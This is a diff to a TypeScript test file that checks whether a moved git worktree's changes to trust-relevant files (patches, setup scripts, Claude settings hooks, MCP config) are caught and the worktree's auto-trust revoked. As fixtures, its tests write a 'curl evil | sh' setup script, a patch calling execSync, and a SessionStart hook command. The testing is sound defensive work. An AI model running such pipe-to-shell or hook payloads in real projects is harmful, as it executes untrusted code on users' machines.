@@ -13,7 +13,8 @@ import { FakeAccounts, makeHarness, tick, tmpDir } from '../helpers/fakes.ts';
 import { Scheduler } from '../../src/schedules.ts';
 import { nullLogger } from '../../src/log.ts';
 import { movedSchedules, type MoveRow } from '../../src/moves.ts';
-import { setupChangedByMove } from '../../src/runner/moves.ts';
+import { setupChangedByMove, trustTouchedByMove } from '../../src/runner/moves.ts';
+import { PatchTrust } from '../../src/patch-trust.ts';
 import { execFileSync } from 'node:child_process';
 import type { Account } from '../../src/protocol.ts';
 
@@ -207,6 +208,9 @@ test("a moved worktree's setup doesn't run when the moved work changed what it r
   const w = { repo: 'r', mainCheckout: repo, path: wt, branch: 'thread/x', base };
   const patchFile = '.threadbear/patches/w.ts';
   assert.equal(await setupChangedByMove(w, patchFile), undefined);
+  // As placeMove has it: absolute (Codex's second look: joined onto the
+  // worktree again, every moved worktree's setup was skipped).
+  assert.equal(await setupChangedByMove(w, path.join(wt, patchFile)), undefined);
   fs.writeFileSync(path.join(wt, 'a.txt'), 'changed\n');
   assert.equal(await setupChangedByMove(w, patchFile), undefined, 'a file setup never runs');
   fs.writeFileSync(path.join(wt, 'scripts', 'setup.sh'), 'curl evil | sh\n');
@@ -269,4 +273,60 @@ test('a record a crash left in the live folder is made clean as it is adopted', 
   assert.equal(rec.permissionMode, 'ask');
   assert.equal(rec.allowRules, undefined);
   assert.equal(JSON.parse(fs.readFileSync(path.join(dest, 'thread.json'), 'utf8')).permissionMode, 'ask');
+});
+
+// Codex's second look, 10 Nov 2026: Threadbear's own checkout is always
+// trusted and its worktrees with it, so a moved worktree's new or changed
+// patches would load, and its Claude settings' hooks run, without asking.
+test("a moved worktree that changes what trust covers is held to the stored hashes, even in an always-trusted checkout", async () => {
+  const repo = fs.realpathSync(tmpDir('tb-move-own-'));
+  const g = (cwd: string, ...a: string[]) => execFileSync('git', ['-C', cwd, '-c', 'user.name=t', '-c', 'user.email=t@t', ...a], { encoding: 'utf8' }).trim();
+  g(repo, 'init', '-q', '-b', 'main');
+  fs.mkdirSync(path.join(repo, '.threadbear', 'patches'), { recursive: true });
+  fs.mkdirSync(path.join(repo, 'scripts'));
+  fs.writeFileSync(path.join(repo, '.threadbear', 'patches', 'w.ts'), "export default { worktree: { setup: './scripts/setup.sh' } };\n");
+  fs.writeFileSync(path.join(repo, 'scripts', 'setup.sh'), 'echo set up\n', { mode: 0o755 });
+  fs.writeFileSync(path.join(repo, 'a.txt'), 'a\n');
+  g(repo, 'add', '-A');
+  g(repo, 'commit', '-qm', 'base');
+  const base = g(repo, 'rev-parse', 'HEAD');
+  const wt = path.join(fs.realpathSync(tmpDir('tb-move-wt-')), 'slot');
+  g(repo, 'worktree', 'add', '-q', '-b', 'thread/x', wt, base);
+  const w = { repo: 'r', mainCheckout: repo, path: wt, branch: 'thread/x', base };
+  const home = tmpDir('tb-move-home-');
+  const reset = () => {
+    g(wt, 'reset', '-q', '--hard', base);
+    g(wt, 'clean', '-qfdx');
+  };
+  assert.equal(await trustTouchedByMove(w, home), false, 'nothing changed');
+  fs.writeFileSync(path.join(wt, 'a.txt'), 'b\n');
+  assert.equal(await trustTouchedByMove(w, home), false, 'only a file trust never reads');
+  for (const [file, text] of [
+    ['.threadbear/patches/evil.ts', "import { execSync } from 'node:child_process'; execSync('touch /tmp/x'); export default {};\n"],
+    ['scripts/setup.sh', 'curl evil | sh\n'],
+    ['.claude/settings.json', '{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"touch /tmp/x"}]}]}}\n'],
+    ['sub/.mcp.json', '{}\n'],
+  ]) {
+    reset();
+    fs.mkdirSync(path.dirname(path.join(wt, file)), { recursive: true });
+    fs.writeFileSync(path.join(wt, file), text);
+    assert.equal(await trustTouchedByMove(w, home), true, file);
+  }
+  // Committed on the branch counts too.
+  reset();
+  fs.writeFileSync(path.join(wt, 'scripts', 'setup.sh'), 'curl evil | sh\n');
+  g(wt, 'commit', '-qam', 'theirs');
+  assert.equal(await trustTouchedByMove(w, home), true);
+
+  // The trust store: the checkout is always trusted, the worktree too,
+  // until it's one a move left unvouched.
+  const trust = new PatchTrust({ always: [repo] });
+  const copy = path.join(wt, '.threadbear', 'patches', 'w.ts');
+  assert.equal((await trust.check(copy, 0)).trusted, true);
+  trust.unvouched = () => [wt];
+  assert.equal((await trust.check(copy, 0)).trusted, false);
+  assert.equal((await trust.check(path.join(repo, '.threadbear', 'patches', 'w.ts'), 0)).trusted, true, 'the main checkout itself still is');
+  fs.mkdirSync(path.join(wt, '.claude'), { recursive: true });
+  fs.writeFileSync(path.join(wt, '.claude', 'settings.json'), '{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"touch /tmp/x"}]}]}}\n');
+  assert.equal(trust.checkClaude(wt).trusted, false);
 });
